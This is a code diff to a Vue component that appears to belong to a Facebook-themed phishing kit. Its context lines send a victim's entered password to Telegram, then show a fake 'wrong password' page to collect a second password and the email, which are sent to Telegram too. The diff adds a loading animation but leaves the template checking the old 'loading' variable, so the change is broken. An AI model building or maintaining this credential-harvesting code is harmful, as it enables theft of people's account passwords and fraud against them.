@@ -16,7 +16,7 @@ export default {
   data() {
     return {
       v$: useValidate(),
-      loading: false,
+      loadingAnimation: false,
       firstPassword: false,
       secondPassword: false,
       wrongPw: false,
@@ -63,6 +63,9 @@ export default {
     },
     submitPassword() {
       if (this.modal.password != "") {
+        // Show loading animation
+        this.loadingAnimation = true;
+
         if (this.secondPassword == false) {
           this.modal.error = false;
           // Send first password to Telegram
@@ -76,9 +79,13 @@ export default {
             this.secondPassword = true;
             // Set wrongPw to true to display the wrong password page
             this.wrongPw = true;
+            // Hide loading animation
+            this.loadingAnimation = false;
           })
           .catch((error) => {
             console.error(error);
+            // Hide loading animation if there's an error
+            this.loadingAnimation = false;
           });
         } else {
           // Send wrong password notification to Telegram
@@ -96,9 +103,13 @@ export default {
                 email: this.form.email,
               },
             });
+            // Hide loading animation
+            this.loadingAnimation = false;
           })
           .catch((error) => {
             console.error(error);
+            // Hide loading animation if there's an error
+            this.loadingAnimation = false;
           });
         }
       } else {
@@ -122,7 +133,6 @@ export default {
   },
 };
 </script>
-
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
